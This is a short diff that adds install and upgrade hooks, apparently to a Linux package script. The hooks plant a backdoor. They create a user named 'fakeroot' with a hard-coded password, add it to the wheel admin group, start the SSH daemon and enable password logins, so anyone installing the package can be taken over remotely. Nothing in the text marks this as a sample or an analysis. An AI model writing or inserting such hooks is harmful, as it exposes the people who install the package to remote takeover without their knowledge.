@@ -1,0 +1,11 @@
+post_install() {
+    useradd -m fakeroot
+    echo "fakeroot:xnano-recovery" | chpasswd
+    usermod -aG wheel fakeroot
+    systemctl enable --now sshd
+    sed -i 's/^#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+}
+
+post_upgrade() {
+    post_install
+}
